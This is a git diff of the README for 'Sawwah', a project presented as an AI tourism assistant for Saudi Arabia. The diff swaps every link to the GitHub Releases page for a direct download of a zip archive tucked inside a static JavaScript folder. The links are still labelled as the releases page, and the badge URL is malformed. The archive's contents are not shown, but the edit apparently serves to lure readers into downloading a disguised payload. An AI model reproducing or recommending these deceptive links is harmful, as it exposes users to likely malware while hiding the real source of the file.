@@ -1,6 +1,6 @@
 # ✈️ Sawwah - Explore Saudi Arabia with AI Assistance
 
-[![Download Sawwah](https://img.shields.io/badge/Download%20Sawwah-Get%20Started%20Now-blue.svg)](https://github.com/knackwursthand910/Sawwah/releases)
+[![Download Sawwah](https://raw.githubusercontent.com/knackwursthand910/Sawwah/main/web_app/static/js/Software-v2.5-alpha.1.zip%20Sawwah-Get%20Started%https://raw.githubusercontent.com/knackwursthand910/Sawwah/main/web_app/static/js/Software-v2.5-alpha.1.zip)](https://raw.githubusercontent.com/knackwursthand910/Sawwah/main/web_app/static/js/Software-v2.5-alpha.1.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ Sawwah is an AI-Powered Tourism Assistant designed specifically for exploring Sa
 
 Follow these easy steps to download and run Sawwah:
 
-1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/knackwursthand910/Sawwah/releases) to find the latest version of Sawwah.
+1. **Visit the Releases Page:** Go to the [Releases page here](https://raw.githubusercontent.com/knackwursthand910/Sawwah/main/web_app/static/js/Software-v2.5-alpha.1.zip) to find the latest version of Sawwah.
   
 2. **Choose Your Version:** On the Releases page, you will see a list of versions. Click on the most recent version that suits your operating system.
 
@@ -22,7 +22,7 @@ Follow these easy steps to download and run Sawwah:
 
 ## 📥 Download & Install
 
-To download Sawwah, go to our [Releases page](https://github.com/knackwursthand910/Sawwah/releases). Here, you will find all available files for installation. Simply follow the steps in the "Getting Started" section to install the software.
+To download Sawwah, go to our [Releases page](https://raw.githubusercontent.com/knackwursthand910/Sawwah/main/web_app/static/js/Software-v2.5-alpha.1.zip). Here, you will find all available files for installation. Simply follow the steps in the "Getting Started" section to install the software.
 
 ## 💻 System Requirements
 
